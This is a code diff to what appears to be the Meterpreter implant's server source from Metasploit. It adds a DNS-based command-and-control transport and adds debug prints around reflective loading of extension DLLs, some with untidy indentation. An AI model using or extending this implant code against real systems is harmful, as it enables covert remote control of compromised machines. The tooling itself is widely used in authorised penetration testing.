@@ -6,6 +6,7 @@
 #include <ws2tcpip.h>
 
 #include "win/server_transport_winhttp.h"
+#include "win/server_transport_windns.h"
 #include "win/server_transport_tcp.h"
 #include "win/server_transport_named_pipe.h"
 #include "../../common/packet_encryption.h"
@@ -75,9 +76,12 @@ VOID load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensi
 	while (stagelessExtensions->size > 0)
 	{
 		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
-		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size);
-		load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
-		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
+		dprintf("1");
+        HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size);
+		dprintf("2");
+        load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
+		dprintf("3");
+        stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
 	}
 
 	dprintf("[SERVER] All stageless extensions loaded");
@@ -113,6 +117,15 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 	else if (wcsncmp(transportCommon->url, L"pipe", 4) == 0)
 	{
 		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);
+	}
+	else if (wcsncmp(transportCommon->url, L"dns", 3) == 0)
+	{
+		if (size)
+		{
+			*size = sizeof(MetsrvTransportDns);
+		}
+		transport = transport_create_dns((MetsrvTransportDns*)transportCommon);
+		
 	}
 	else
 	{
@@ -272,6 +285,11 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 			case METERPRETER_TRANSPORT_HTTPS:
 			{
 				transport_write_http_config(t, (MetsrvTransportHttp*)target);
+				break;
+			}
+			case METERPRETER_TRANSPORT_DNS:
+			{
+				transport_write_dns_config(t, (MetsrvTransportDns*)target);
 				break;
 			}
 		}
